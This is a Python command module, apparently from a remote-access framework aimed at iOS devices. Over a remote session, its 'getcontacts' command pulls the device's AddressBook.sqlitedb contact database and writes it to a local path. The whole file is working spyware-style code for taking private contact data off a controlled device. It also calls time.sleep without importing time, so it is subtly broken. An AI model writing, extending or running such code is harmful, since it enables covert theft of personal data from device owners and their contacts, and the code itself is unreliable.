#!/usr/bin/env python3

import json
import os
import core.helper as h

class command:
	def __init__(self):
		self.name = "getcontacts"
		self.description = "Get device contacts."
		self.usage = "Usage: getcontacts <local_path>"

	def run(self,session,cmd_data):
		if len(cmd_data['args'].split()) < 1:
			print(self.usage)
			return

		w = os.environ['OLDPWD']
		os.chdir(w)
		dest = cmd_data['args'].split()[0]
		if os.path.isdir(dest):
			if os.path.exists(dest):
				h.info_general("Getting contacts...")
				data = session.download_file('/var/mobile/Library/AddressBook/AddressBook.sqlitedb')
				if data:
					f = open(os.path.join(dest,'contacts.sqlitedb'),'wb')
					f.write(data)
					f.close()
					if dest[-1] == "/":
						h.info_general("Saving to "+dest+"contacts.sqlitedb...")
						time.sleep(1)
						h.info_success("Saved to "+dest+"contacts.sqlitedb!")
					else:
						h.info_general("Saving to "+dest+"/contacts.sqlitedb...")
						time.sleep(1)
						h.info_success("Saved to "+dest+"/contacts.sqlitedb!")
				else:
					h.info_error("Failed to get contacts!")
			else:
				h.info_error("Local directory: "+dest+": does not exist!")
		else:
			rp = os.path.split(dest)[0]
			if rp == "":
				rp = "."
			else:
				pass
			if os.path.exists(rp):
				if os.path.isdir(rp):
					pr = os.path.split(dest)[0]
					rp = os.path.split(dest)[1]
					h.info_general("Getting contacts...")
					data = session.download_file('/var/mobile/Library/AddressBook/AddressBook.sqlitedb')
					if data:
						f = open(os.path.join(pr,rp),'wb')
						f.write(data)
						f.close()
						h.info_general("Saving to "+dest+"...")
						time.sleep(1)
						h.info_success("Saved to "+dest+"!")
					else:
						h.info_error("Failed to get contacts!")
				else:
					h.info_error("Error: "+rp+": not a directory!")
			else:
				h.info_error("Local directory: "+rp+": does not exist!")
		g = os.environ['HOME']
		os.chdir(g + "/mouse")